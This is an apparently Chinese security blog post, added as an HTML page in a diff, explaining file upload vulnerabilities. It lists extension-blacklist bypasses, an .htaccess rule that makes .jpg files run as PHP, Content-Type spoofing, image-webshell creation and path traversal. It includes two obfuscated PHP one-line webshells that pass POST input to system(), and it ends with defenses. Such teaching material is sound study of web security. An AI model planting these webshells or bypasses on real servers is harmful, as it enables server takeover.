@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>深入理解web漏洞之-文件上传 | langke Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">langke&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">langke&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-什么是文件上传漏洞"><span class="toc-text">0x01 什么是文件上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-文件上传绕过分类"><span class="toc-text">0x02 文件上传绕过分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-1-扩展名绕过"><span class="toc-text">0x02.1 扩展名绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-2-MIME类型绕过"><span class="toc-text">0x02.2 MIME类型绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-3-文件内容绕过"><span class="toc-text">0x02.3 文件内容绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-4-上传路径绕过"><span class="toc-text">0x02.4 上传路径绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-危害"><span class="toc-text">0x03 危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-防御方法"><span class="toc-text">0x04 防御方法</span></a></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">深入理解web漏洞之-文件上传</h1>
+            
+                <div class="post-meta">
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">11 03&nbsp;&nbsp;13:09:10</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <h2 id="0x01-什么是文件上传漏洞"><a href="#0x01-什么是文件上传漏洞" class="headerlink" title="0x01 什么是文件上传漏洞"></a>0x01 什么是文件上传漏洞</h2><p><strong>白帽子讲Web安全</strong><br>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。<br>文件上传功能本身是一个正常业务需求，对于网站来说，很多时候也确实需要用户将文件上传到服务器。所以“文件上传”本身没有问题，但有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
+<p><strong>文件上传漏洞利用成功证明方式：</strong></p>
+<a id="more"></a>
+<p><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/深入理解web漏洞/upload_z.png" alt="文件上传漏洞常用证明"></p>
+<h2 id="0x02-文件上传绕过分类"><a href="#0x02-文件上传绕过分类" class="headerlink" title="0x02 文件上传绕过分类"></a>0x02 文件上传绕过分类</h2><h3 id="0x02-1-扩展名绕过"><a href="#0x02-1-扩展名绕过" class="headerlink" title="0x02.1 扩展名绕过"></a>0x02.1 扩展名绕过</h3><blockquote>
+<p>Javascript</p>
+</blockquote>
+<ul>
+<li>绕过</li>
+</ul>
+<ol>
+<li>通过抓包修改后缀为可执行脚本后缀</li>
+</ol>
+<blockquote>
+<p>服务端</p>
+</blockquote>
+<ul>
+<li>绕过：</li>
+</ul>
+<ol>
+<li>文件名大小写</li>
+<li>黑名单时，可用<br><code>php2|php3|php4|php5|pht</code>代替<code>php</code><br><code>aspx|asa|asax|ascx|ashx|asmx|cer|aSp|aSpx|aSa|aSax|aScx</code>代替<code>asp</code><br><code>jspa|jspx|jsw|jsv|jspf|jtml|jSp|jSpx|jSpa|jSw|jSv|jSpf|jHtml</code>代替<code>jsp</code></li>
+<li>利用一些特性，比如<code>1.php%00.jpg</code>、<code>1.php16进制00.jpg</code>、<code>1.php%0a</code>和Windows服务器<code>1.php::$DATA</code>、Linux服务器<code>1.php;.jpg</code></li>
+<li>分两步，仅限Windows系统。第一步，先上传一个文件<code>1.php:.jpg</code>，生成后的文件名为<code>1.php</code>，内容为空。第二步，上传一个包含木马的文件<code>1.php.&lt;&lt;&lt;</code>，访问<code>http://www.······/1.php</code>即可</li>
+<li>上传<code>.htaccess</code>文件，相当于修改apache服务器配置文件，从而把<code>jpg</code>等其他后缀文件当作脚本文件来解析，只适用于apache+php。</li>
+<li>.htaccess<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="0x02-2-MIME类型绕过"><a href="#0x02-2-MIME类型绕过" class="headerlink" title="0x02.2 MIME类型绕过"></a>0x02.2 MIME类型绕过</h3><blockquote>
+<p>Content-Type</p>
+</blockquote>
+<ul>
+<li>绕过：通过这包修改请求头中<code>Content-Type</code>的值为允许的文件类型。<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types" target="_blank" rel="noopener">更详细列表 &gt;&gt; 火狐官方文档</a><br>常见文件类型<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">application/json         ： JSON</span><br><span class="line">text/html                ： HTML格式</span><br><span class="line">text/plain               ： 纯文本格式      </span><br><span class="line">text/xml                 ： XML格式</span><br><span class="line">image/gif                ： gif图片格式    </span><br><span class="line">image/jpeg               ： jpg图片格式 </span><br><span class="line">image/png                ： png图片格式</span><br><span class="line"></span><br><span class="line">application/xhtml+xml    ： XHTML格式</span><br><span class="line">application/xml          ： XML数据格式</span><br><span class="line">application/atom+xml     ： Atom XML聚合格式    </span><br><span class="line">application/json         ： JSON数据格式</span><br><span class="line">application/pdf          ： pdf格式  </span><br><span class="line">application/msword       ： Word文档格式</span><br><span class="line">application/octet-stream ： 二进制流数据（如常见的文件下载）</span><br><span class="line">multipart/form-data      ： 需要在表单中进行文件上传时，就需要使用该格式</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="0x02-3-文件内容绕过"><a href="#0x02-3-文件内容绕过" class="headerlink" title="0x02.3 文件内容绕过"></a>0x02.3 文件内容绕过</h3><blockquote>
+<p>文件幻数（文件头）</p>
+</blockquote>
+<ul>
+<li>绕过：</li>
+</ul>
+<ol>
+<li>windows命令行<code>copy 1.jpg/b + 1.php/b 2.jpg</code>生成图片马</li>
+<li>16进制形式修改文件<br>jpg格式文件幻数：<code>FF D8 FF E0 00 10 4A 46 49 46</code><br>gif格式文件幻数：<code>47 49 46 38 39 61</code><br>png格式文件幻数：<code>89 50 4E 47</code></li>
+</ol>
+<blockquote>
+<p>数据内容</p>
+</blockquote>
+<p>主要是检测一些危险代码。</p>
+<ul>
+<li>绕过：</li>
+</ul>
+<ol>
+<li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">extends</span> <span class="title">ReflectionFunction</span> </span>&#123;&#125;</span><br><span class="line">$f = <span class="keyword">new</span> test(<span class="string">'system'</span>);</span><br><span class="line">$f-&gt;invoke($_POST[<span class="number">2333</span>]);</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$f = nEW ClaSs($_POST[666]) eXTeNDs rEFleCTIoNfUNcTIoN &#123;&#125;;</span><br><span class="line">$f-&gt;iNvOKe($_POST[<span class="number">2333</span>]);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>上面两个一句话摘自phith0n的 PHP动态特性的捕捉与逃逸 </p>
+<h3 id="0x02-4-上传路径绕过"><a href="#0x02-4-上传路径绕过" class="headerlink" title="0x02.4 上传路径绕过"></a>0x02.4 上传路径绕过</h3><ul>
+<li>用到的情况：</li>
+</ul>
+<ol>
+<li>上传后的文件不在web目录下</li>
+<li>上传后的文件所在的目录不可访问</li>
+<li>上传后的目录文件禁止执行</li>
+</ol>
+<ul>
+<li>绕过：</li>
+</ul>
+<ol>
+<li>通过抓包，确认上传路径是否可控，如果可控，可通过<code>../</code>、<code>upload/a.php/</code>、<code>c:\www\</code>等把文件上传到指定目录。</li>
+<li>某些已知框架，通过抓包，自行添加路径参数，如<code>path=../</code>、<code>path=upload/a.php%00.gif</code></li>
+</ol>
+<h2 id="0x03-危害"><a href="#0x03-危害" class="headerlink" title="0x03 危害"></a>0x03 危害</h2><p>可直接导致web服务器被攻击者控制。</p>
+<h2 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h2><ol>
+<li>尽量使用没有漏洞的组件和框架</li>
+<li>对上传的文件后缀进行限制</li>
+<li>严格控制上传目录及上传目录的权限</li>
+<li>对上传后的文件强制改名和后缀，文件名要求不可遍历、无规律、混淆处理等，后缀写到后端代码里进行拼接。</li>
+<li>把上传的文件放到云服务上面（保证key不泄露），比如BOS。</li>
+</ol>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+
+        <!--
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/深入理解web漏洞/"># 深入理解web漏洞</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        -->
+        <!--
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/11/03/软件官网下载地址/">软件官网下载地址</a>
+            
+            
+            <a class="next" rel="next" href="/2019/11/01/社会工程学信息收集/">社会工程学信息收集</a>
+            
+        </section>
+        -->
+
+    </article>
+</div>
+
+        </div>
+        <!--
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© langke | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    	-->
+
+    	<br>
+    	<br>
+    	<br>
+
+
+
+    </div>
+</body>
+</html>
